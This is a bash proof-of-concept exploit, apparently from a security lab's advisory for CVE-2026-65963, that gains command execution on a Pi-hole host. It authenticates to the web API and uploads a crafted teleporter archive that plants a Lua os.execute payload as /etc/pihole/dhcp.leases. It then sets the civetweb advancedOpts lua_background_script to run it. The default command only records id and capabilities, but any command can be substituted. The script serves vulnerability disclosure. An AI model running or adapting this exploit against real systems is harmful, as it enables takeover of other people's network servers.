#!/bin/bash
#
# LinnemanLabs - pi-hole civetweb advancedopts PoC
# CVE-2026-65963
#
# https://linnemanlabs.com/pi-hole-root-with-extra-steps
# https://github.com/linnemanlabs/advisories/
#
# uses web login to run CMD on the remote pi-hole host
# default CMD prints id and caps to /tmp/exec-proof
#
PIPASS="password"
PIHOST="192.168.1.1"
CMD="id > /tmp/exec-proof; grep Cap /proc/self/status >> /tmp/exec-proof"

set -eu
# Login (skip in no-password mode)
SID="$( curl -sk -X POST http://${PIHOST}/api/auth -H 'Content-Type: application/json' -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
if [ "${SID}x" == "x" ];then
  echo "[-] cant create session with ${PIHOST} - is host up and password correct?"
  exit 1
fi

# Create crafted teleport file to stage the Lua script
# (can also skip this and just stage it locally if you have ssh access)
printf "os.execute(\"%s\")" "$CMD" > dhcp.leases
tar -zcf teleport.dhcp.tar.gz dhcp.leases

# POST the crafted .tar.gz to teleport (can skip this if you staged it locally already)
res="$( curl -sk -H "X-FTL-SID: $SID" -X POST http://${PIHOST}/api/teleporter -F "file=@teleport.dhcp.tar.gz" )"
resfiles="$( echo "${res}" | jq -r .files.[0] )"
if [ "${resfiles}" == "/etc/pihole/dhcp.leases" ];then
  echo "[+] staged /etc/pihole/dhcp.leases on pihole host"
else
  echo "[-] bad response from API. Full response: ${res}"
fi

# Script is staged (/etc/pihole/dhcp.leases)

# Point advancedOpts lua_background_script at it
res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH http://${PIHOST}/api/config -H 'Content-Type: application/json' \
     -d '{"config":{"webserver":{"advancedOpts":["lua_background_script=/etc/pihole/dhcp.leases"]}}}' 2>/dev/null )"
resopts="$( echo "${res}" | jq -r ".config.webserver.advancedOpts.[0]" )"

if [ "${resopts}" == "lua_background_script=/etc/pihole/dhcp.leases" ];then
  echo "[+] pihole loaded our config, check for exec result on pihole host"
else
  printf "[-] pihole did not set our config options.\n[-] config.webserver.advancedOpts: %s\n[-] full response: ${res}\n" "$resopts"
fi

exit 0

